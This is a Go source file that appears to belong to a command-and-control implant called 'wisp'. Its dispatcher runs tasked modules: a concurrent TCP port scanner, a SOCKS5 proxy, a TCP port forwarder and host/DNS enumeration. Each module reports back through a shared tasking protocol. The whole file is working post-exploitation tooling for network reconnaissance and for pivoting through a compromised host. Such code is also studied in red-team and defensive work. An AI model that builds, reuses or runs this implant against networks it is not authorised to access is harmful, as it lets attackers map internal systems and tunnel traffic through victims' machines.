package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/user/wisp/shared/protocol"
)

// Protocol status helpers keep job results in sync with the shared constants.
func protocolTaskJobOutput() string { return protocol.TaskJobOutput }
func protocolTaskCompleted() string { return protocol.TaskCompleted }
func protocolTaskFailed() string    { return protocol.TaskFailed }

// ioCopy copies src to dst and half-closes on completion.
func ioCopy(dst net.Conn, src net.Conn) {
	_, _ = io.Copy(dst, src)
	if tc, ok := src.(*net.TCPConn); ok {
		_ = tc.CloseWrite()
	}
	if tc, ok := dst.(*net.TCPConn); ok {
		_ = tc.CloseWrite()
	}
}

// execPortscanCmd runs an asynchronous TCP connect scan. args:
// {"targets":["10.0.0.1","10.0.0.2"],"ports":[80,443],"timeout_ms":500}
func (d *Dispatcher) execPortscanCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		Targets  []string `json:"targets"`
		Ports    []int    `json:"ports"`
		Timeout  int      `json:"timeout_ms"`
		MaxConns int      `json:"max_conns"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	if len(args.Targets) == 0 || len(args.Ports) == 0 {
		return d.finish(task, "error: targets and ports are required", "failed")
	}
	timeout := time.Duration(args.Timeout) * time.Millisecond
	if timeout <= 0 {
		timeout = 800 * time.Millisecond
	}
	maxConns := args.MaxConns
	if maxConns <= 0 {
		maxConns = 100
	}

	return d.startJob("portscan", task, func(ctx context.Context) []Result {
		var results []Result
		for _, target := range args.Targets {
			open := scanHost(ctx, target, args.Ports, timeout, maxConns)
			if len(open) == 0 {
				results = append(results, Result{TaskID: task.ID, Output: target + ": no open ports", Status: protocolTaskJobOutput()})
				continue
			}
			parts := make([]string, 0, len(open))
			for _, p := range open {
				parts = append(parts, strconv.Itoa(p))
			}
			results = append(results, Result{TaskID: task.ID, Output: target + ": " + strings.Join(parts, ","), Status: protocolTaskJobOutput()})
		}
		results = append(results, Result{TaskID: task.ID, Output: "portscan complete", Status: protocolTaskCompleted()})
		return results
	})
}

// scanHost probes a host for open TCP ports with bounded concurrency.
func scanHost(ctx context.Context, host string, ports []int, timeout time.Duration, maxConns int) []int {
	var mu sync.Mutex
	open := []int{}
	sem := make(chan struct{}, maxConns)
	var wg sync.WaitGroup
	for _, p := range ports {
		select {
		case <-ctx.Done():
			return open
		default:
		}
		sem <- struct{}{}
		wg.Add(1)
		go func(port int) {
			defer func() { <-sem; wg.Done() }()
			addr := net.JoinHostPort(host, strconv.Itoa(port))
			conn, err := net.DialTimeout("tcp", addr, timeout)
			if err != nil {
				return
			}
			conn.Close()
			mu.Lock()
			open = append(open, port)
			mu.Unlock()
		}(p)
	}
	wg.Wait()
	return open
}

// execSocksCmd starts a SOCKS5 server (CONNECT only) as an async job. args:
// {"port":1080,"user":"","pass":""}
func (d *Dispatcher) execSocksCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		Port int    `json:"port"`
		User string `json:"user"`
		Pass string `json:"pass"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	if args.Port <= 0 || args.Port > 65535 {
		return d.finish(task, "error: invalid port", "failed")
	}
	return d.startJob("socks", task, func(ctx context.Context) []Result {
		var out []Result
		ln, err := net.Listen("tcp", fmt.Sprintf(":%d", args.Port))
		if err != nil {
			out = append(out, Result{TaskID: task.ID, Output: "socks failed: " + err.Error(), Status: protocolTaskFailed()})
			return out
		}
		out = append(out, Result{TaskID: task.ID, Output: fmt.Sprintf("SOCKS5 listening on 0.0.0.0:%d", args.Port), Status: protocolTaskJobOutput()})
		go func() {
			<-ctx.Done()
			ln.Close()
		}()
		for {
			conn, err := ln.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return out
				default:
					continue
				}
			}
			go handleSocksConn(conn, args.User, args.Pass)
		}
	})
}

// handleSocksConn runs the SOCKS5 greeting + connect for a single client.
func handleSocksConn(conn net.Conn, user, pass string) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Greeting: VER(1) NMETHODS(1) METHODS(..)
	greet := make([]byte, 2)
	if _, err := conn.Read(greet); err != nil {
		return
	}
	if greet[0] != 0x05 {
		return
	}
	methods := make([]byte, int(greet[1]))
	if _, err := conn.Read(methods); err != nil {
		return
	}
	useAuth := user != ""
	// Prefer auth if we have credentials; else no-auth if offered.
	method := byte(0x00)
	if useAuth {
		method = 0x02
	} else {
		for _, m := range methods {
			if m == 0x00 {
				method = 0x00
				break
			}
		}
		if method != 0x00 {
			conn.Write([]byte{0x05, 0xFF})
			return
		}
	}
	conn.Write([]byte{0x05, method})

	if useAuth {
		// RFC1929: VER(1) ULEN(1) UNAME(..) PLEN(1) PASSWD(..)
		auth := make([]byte, 2)
		if _, err := conn.Read(auth); err != nil {
			return
		}
		uname := make([]byte, int(auth[1]))
		if _, err := conn.Read(uname); err != nil {
			return
		}
		plen := make([]byte, 1)
		if _, err := conn.Read(plen); err != nil {
			return
		}
		passwd := make([]byte, int(plen[0]))
		if _, err := conn.Read(passwd); err != nil {
			return
		}
		if string(uname) != user || string(passwd) != pass {
			conn.Write([]byte{0x01, 0x01})
			return
		}
		conn.Write([]byte{0x01, 0x00})
	}

	// Request: VER CMD RSV ATYP ADDR PORT
	req := make([]byte, 4)
	if _, err := conn.Read(req); err != nil {
		return
	}
	if req[1] != 0x01 { // CONNECT only
		conn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	atyp := req[3]
	var host string
	switch atyp {
	case 0x01: // IPv4
		b := make([]byte, 4)
		if _, err := conn.Read(b); err != nil {
			return
		}
		host = net.IP(b).String()
	case 0x03: // domain
		l := make([]byte, 1)
		if _, err := conn.Read(l); err != nil {
			return
		}
		dn := make([]byte, int(l[0]))
		if _, err := conn.Read(dn); err != nil {
			return
		}
		host = string(dn)
	case 0x04: // IPv6
		b := make([]byte, 16)
		if _, err := conn.Read(b); err != nil {
			return
		}
		host = net.IP(b).String()
	default:
		return
	}
	portB := make([]byte, 2)
	if _, err := conn.Read(portB); err != nil {
		return
	}
	port := int(portB[0])<<8 | int(portB[1])

	upstream, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 10*time.Second)
	if err != nil {
		conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	defer upstream.Close()
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	_ = conn.SetDeadline(time.Time{})
	pipe(conn, upstream)
}

// pipe bidirectionally copies data between two connections.
func pipe(a, b net.Conn) {
	var wg sync.WaitGroup
	wg.Add(2)
	go func() { defer wg.Done(); ioCopy(a, b) }()
	go func() { defer wg.Done(); ioCopy(b, a) }()
	wg.Wait()
}

// execPortfwdCmd starts a TCP port forward as a job. args:
// {"lport":8080,"rhost":"10.0.0.5","rport":80}
func (d *Dispatcher) execPortfwdCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		LPort int    `json:"lport"`
		RHost string `json:"rhost"`
		RPort int    `json:"rport"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	if args.LPort <= 0 || args.RHost == "" || args.RPort <= 0 {
		return d.finish(task, "error: lport, rhost and rport are required", "failed")
	}
	return d.startJob("portfwd", task, func(ctx context.Context) []Result {
		var out []Result
		ln, err := net.Listen("tcp", fmt.Sprintf(":%d", args.LPort))
		if err != nil {
			out = append(out, Result{TaskID: task.ID, Output: "portfwd failed: " + err.Error(), Status: protocolTaskFailed()})
			return out
		}
		out = append(out, Result{TaskID: task.ID, Output: fmt.Sprintf("forwarding 0.0.0.0:%d -> %s:%d", args.LPort, args.RHost, args.RPort), Status: protocolTaskJobOutput()})
		go func() { <-ctx.Done(); ln.Close() }()
		for {
			conn, err := ln.Accept()
			if err != nil {
				return out
			}
			go func(c net.Conn) {
				defer c.Close()
				target := net.JoinHostPort(args.RHost, strconv.Itoa(args.RPort))
				up, err := net.DialTimeout("tcp", target, 10*time.Second)
				if err != nil {
					return
				}
				defer up.Close()
				pipe(c, up)
			}(conn)
		}
	})
}

// execNetEnumCmd performs basic host/DNS enumeration. args: {"hosts":["host1","10.0.0.2"]}
func (d *Dispatcher) execNetEnumCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		Hosts []string `json:"hosts"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	var b strings.Builder
	for _, h := range args.Hosts {
		addrs, err := net.LookupHost(h)
		if err != nil {
			fmt.Fprintf(&b, "%s: resolve failed (%v)\n", h, err)
			continue
		}
		fmt.Fprintf(&b, "%s -> %s\n", h, strings.Join(addrs, ", "))
	}
	return d.finish(task, strings.TrimSpace(b.String()), "")
}
